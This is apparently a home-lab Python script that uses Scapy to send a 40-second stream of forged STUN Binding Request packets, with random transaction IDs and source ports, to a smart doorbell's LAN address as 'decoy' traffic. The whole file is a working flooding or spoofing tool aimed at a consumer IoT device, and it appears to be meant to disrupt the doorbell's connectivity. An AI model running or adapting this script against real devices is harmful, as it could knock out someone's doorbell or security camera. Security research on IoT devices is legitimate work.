from scapy.all import *
import time
import random

# Doorbell IP (change every time doorbell is connected)
target_ip = "192.168.137.63"
stun_port = 3478  # Default STUN port

# Generates random transaction ID
def generate_fake_transaction_id():
    return bytes(random.getrandbits(8) for _ in range(12))

# fake STUN Request packet
def build_stun_request():
    message_type = b'\x00\x01'              # Binding Request
    message_length = b'\x00\x00'            
    magic_cookie = b'\x21\x12\xa4\x42'      # Standard STUN cookie
    transaction_id = generate_fake_transaction_id()
    stun_payload = message_type + message_length + magic_cookie + transaction_id
    return stun_payload

# Sends fake STUN packets for set time
def send_fake_stun(duration=40):
    print(f"Sending fake STUN packets to {target_ip}:{stun_port} for {duration} seconds...")
    start = time.time()

    while time.time() - start < duration:
        # Random high source port
        src_port = random.randint(49152, 65535)
        # Craft packet
        stun_payload = build_stun_request()
        packet = IP(dst=target_ip)/UDP(sport=src_port, dport=stun_port)/Raw(load=stun_payload)
        send(packet, verbose=False)
        time.sleep(0.01)  # decoy packet rate

    print("Finished sending fake STUN packets.")

# Entry point
if __name__ == "__main__":
    try:
        send_fake_stun(duration=40)
    except KeyboardInterrupt:
        print("\n Stopped sending stun decoy packets.")